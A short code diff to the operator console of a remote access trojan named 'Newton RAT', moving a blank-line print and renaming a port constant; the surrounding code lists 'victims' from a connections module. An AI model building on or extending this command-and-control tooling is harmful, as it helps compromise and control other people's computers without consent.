@@ -67,6 +67,7 @@ class Cli:
     def greetings(self):
         print("\nWelcome to server control of Newton RAT!\n")
         self.__show_server_commands()
+        print("")
 
     def handle(self):
         while True:
@@ -83,7 +84,6 @@ class Cli:
 
         for n, c in zip(range(len(self.cli_commands)), [c[0] for c in self.cli_commands]):
             print(f"({n}) {c}")
-        print("")
 
     def __print_list_of_victims(self):
         victims_sockets = connections.get_victims()
@@ -216,5 +216,5 @@ class Server:
 
 
 if __name__ == "__main__":
-    Server("0.0.0.0", DEFAULT_SERVER_PORT).run()
+    Server("0.0.0.0", SERVER_PORT).run()
     Cli().start()
